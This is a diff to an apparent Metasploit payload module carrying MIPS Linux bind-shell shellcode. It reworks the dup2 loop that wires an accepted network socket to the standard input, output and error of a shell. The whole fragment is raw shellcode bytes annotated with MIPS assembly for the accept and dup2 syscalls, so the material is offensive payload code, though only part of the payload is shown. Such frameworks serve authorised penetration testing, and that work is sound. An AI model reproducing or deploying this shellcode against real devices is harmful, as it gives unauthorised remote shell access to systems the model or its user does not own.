@@ -23,7 +23,7 @@ module Metasploit3
           'scut',             # Original mips-irix-portshell shellcode
           'vaicebine',        # Original shellcode mod
           'Vlatko Kosturjak', # Metasploit module
-          'juan vazquez'      # Optimizations
+          'juan vazquez'      # Small fixes and optimizations
         ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
@@ -85,16 +85,16 @@ module Metasploit3
     "\x48\x10\x02\x24" + #     li      v0,4168 ( __NR_accept )
     "\x0c\x01\x01\x01" + #     syscall
 
-    "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
-    "\x25\x20\x10\x02" + #     or      a0,s0,s0
-    "\xfd\xff\x0f\x24" + #     li      t7,-3
-    "\x27\x78\xe0\x01" + #     nor     t7,t7,zero
-    "\x21\x28\xe0\x01" + #     move    a1,t7   # dup2_loop
-    "\xdf\x0f\x02\x24" + #     li      v0,4063 # sys_dup2
+    "\xff\xff\xa2\xaf" + #     sw v0,-1(sp) # socket
+    "\xfd\xff\x0f\x24" + #     li t7,-3
+    "\x27\x78\xe0\x01" + #     nor t7,t7,zero
+    "\xff\xff\xa4\x8f" + #     lw a0,-1(sp)
+    "\x21\x28\xe0\x01" + #     move a1,t7   # dup2_loop
+    "\xdf\x0f\x02\x24" + #     li v0,4063 ( __NR_dup2 )
     "\x0c\x01\x01\x01" + #     syscall 0x40404
-    "\xff\xff\x10\x24" + #     li      s0,-1
-    "\xff\xff\xef\x21" + #     addi    t7,t7,-1
-    "\xfa\xff\xf0\x15" + #     bne     t7,s0,dup2_loop
+    "\xff\xff\x10\x24" + #     li s0,-1
+    "\xff\xff\xef\x21" + #     addi t7,t7,-1
+    "\xfa\xff\xf0\x15" + #     bne t7,s0,<dup2_loop>
 
     "\x50\x73\x06\x24" + #     li      a2,0x7350
     "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
